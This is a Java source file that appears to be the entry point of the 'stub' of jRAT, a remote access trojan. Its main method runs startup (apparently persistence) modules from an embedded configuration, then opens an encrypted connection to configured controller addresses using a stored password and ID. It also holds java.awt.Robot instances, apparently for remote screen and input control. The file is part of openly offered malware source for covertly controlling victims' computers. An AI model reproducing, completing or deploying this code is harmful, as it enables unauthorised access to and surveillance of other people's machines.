package io.jrat.stub;

import io.jrat.common.OperatingSystem;
import io.jrat.common.crypto.Crypto;
import io.jrat.stub.modules.startup.StartupModules;
import io.jrat.stub.utils.Utils;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Robot;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.io.File;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Date;

import javax.swing.ImageIcon;

public class Main {

	public static String[] args;
	
	public static byte[] aesKey;
	public static KeyPair rsaPair;
	public static boolean encryption = true;

	public static Robot robot;	
	public static Robot[] robots;

	public static void main(String[] args) {
		Main.args = args;
		
		try {
			StartupModules.execute(Configuration.getConfig());
			
			new Thread(new Connection()).start();
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static String getPass() {
		return Configuration.pass;
	}

	public static String[] getAddresses() {
		return Configuration.addresses;
	}

	public static String getID() {
		return Configuration.id;
	}

	public static byte[] getKey() {
		return aesKey;
	}

	public static String debug(Object s) {
		if (!Configuration.debugMessages) {
			return null;
		}
		if (s == null) {
			s = "null";
		}
		System.out.println(s.toString());
		return s.toString();
	}

	public static KeyPair getKeyPair() throws Exception {
		if (rsaPair == null) {
			KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
			kpg.initialize(Crypto.RSA_SIZE);
			KeyPair kp = kpg.genKeyPair();
			PublicKey publicKey = kp.getPublic();
			PrivateKey privateKey = kp.getPrivate();

			rsaPair = new KeyPair(publicKey, privateKey);
		}

		return rsaPair;
	}

}
